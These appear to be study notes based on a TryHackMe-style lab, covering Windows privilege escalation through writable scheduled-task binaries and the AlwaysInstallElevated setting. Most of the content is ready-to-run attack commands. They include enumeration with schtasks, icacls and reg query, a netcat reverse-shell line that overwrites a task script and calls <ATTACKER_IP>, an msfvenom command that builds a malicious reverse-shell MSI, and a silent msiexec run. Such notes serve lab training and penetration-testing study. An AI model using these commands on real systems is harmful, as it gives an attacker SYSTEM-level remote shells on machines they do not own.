# Windows Privilege Escalation Notes — Misconfiguration-Based Techniques

> Notes based on TryHackMe-style Windows privesc walkthrough. These are common
> in CTF/lab environments; less common but still possible in real engagements.

## 1. Scheduled Tasks

Misconfigured scheduled tasks can let a low-privileged user hijack a binary
that runs as a higher-privileged user.

**Enumerate tasks:**
```cmd
schtasks /query /tn <taskname> /fo list /v
```
Key fields to check:
- `Task To Run` — the binary/script executed
- `Run As User` — the account context it runs under

**Check permissions on the target binary:**
```cmd
icacls C:\path\to\binary.bat
```
If `BUILTIN\Users` has `F` (Full Control) or `W` (Write), you can overwrite it.

**Exploit — overwrite with a reverse shell payload:**
```cmd
echo C:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> 4444 > C:\tasks\schtask.bat
```

**Listener (attacker machine):**
```bash
nc -lvp 4444
```

**Trigger the task (if allowed manually):**
```cmd
schtasks /run /tn <taskname>
```

Result: reverse shell running as the task's configured user.

---

## 2. AlwaysInstallElevated

Allows `.msi` installers to run with SYSTEM/admin privileges regardless of
the invoking user's privilege level.

**Check required registry values (both must be set to `1`):**
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

**Generate malicious MSI payload:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o malicious.msi
```

**Set up Metasploit handler**, transfer the MSI to the target, then execute:
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

Result: reverse shell with elevated (admin/SYSTEM) privileges.

---

## Quick Reference Table

| Technique | Check | Exploit | Requirement |
|---|---|---|---|
| Scheduled Tasks | `icacls` on task binary | Overwrite binary, trigger task | Write access to task binary |
| AlwaysInstallElevated | `reg query` both HKCU/HKLM | Malicious `.msi` via msfvenom | Both reg keys = 1 |
